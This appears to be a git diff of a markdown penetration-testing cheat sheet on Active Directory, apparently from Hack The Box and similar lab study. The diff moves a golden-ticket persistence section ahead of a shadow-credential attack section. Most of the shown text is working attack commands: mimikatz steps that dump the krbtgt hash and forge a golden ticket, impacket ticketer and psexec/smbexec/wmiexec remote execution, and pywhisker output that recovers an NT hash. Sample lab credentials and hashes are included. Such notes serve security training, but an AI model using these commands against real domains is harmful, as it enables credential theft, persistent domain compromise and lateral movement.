@@ -389,7 +389,30 @@ sudo python3 noPac.py INLANEFREIGHT.LOCAL/forend:Klmcargo2 -dc-ip 172.16.5.5 -dc
 Detect:
 nxc smb ip -u username -p pass -M petitpotam
 ```
-### Shadow Credential Attack
+### Persistence
+#### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
+>The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method
+```
+privilege::debug
+lsadump::lsa /patch(get password hash)
+kerberos::purge
+kerberos::golden /user:any_exist_domain_user /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part,from lsadump::lsa /patch) /krbtgt:75b60230a2394a812000dbfad8415965(from lsadump::lsa /patch) /ptt
+misc::cmd(launch a new command prompt)
+psexec.exe \\dc01 cmd.exe
+
+# To generate the TGT with NTLM
+python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+# To generate the TGT with AES key
+python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
+# Set the ticket for impacket use
+export KRB5CCNAME=<TGS_ccache_file>
+
+# Execute remote commands with any of the following by using the TGT
+python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
+```
+#### Shadow Credential Attack
 ```
 python3 pywhisker.py -d "certified.htb" -u "judith.mader" -p "judith09" --target "management_svc" --action "add"
 [*] Searching for the target account
@@ -426,30 +449,6 @@ Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies
 [*] Requesting ticket to self with PAC
 Recovered NT Hash
 a091c1832bcdd4677c28b5a6a1295584
-```
-
-### Persistence
-#### Golden Tickets(only if we can get password hash of a domain user account called krbtgt)
->The golden ticket will require us to have access to a Domain Admin's group account or to have compromised the domain controller itself to work as a persistence method
-```
-privilege::debug
-lsadump::lsa /patch(get password hash)
-kerberos::purge
-kerberos::golden /user:any_exist_domain_user /domain:corp.com /sid:S-1-5-21-1602875587-2787523311-2599479668(domain SID part,from lsadump::lsa /patch) /krbtgt:75b60230a2394a812000dbfad8415965(from lsadump::lsa /patch) /ptt
-misc::cmd(launch a new command prompt)
-psexec.exe \\dc01 cmd.exe
-
-# To generate the TGT with NTLM
-python ticketer.py -nthash <krbtgt_ntlm_hash> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
-# To generate the TGT with AES key
-python ticketer.py -aesKey <aes_key> -domain-sid <domain_sid> -domain <domain_name>  <user_name>
-# Set the ticket for impacket use
-export KRB5CCNAME=<TGS_ccache_file>
-
-# Execute remote commands with any of the following by using the TGT
-python psexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-python smbexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
-python wmiexec.py <domain_name>/<user_name>@<remote_hostname> -k -no-pass
 ```
 
 ### Tips
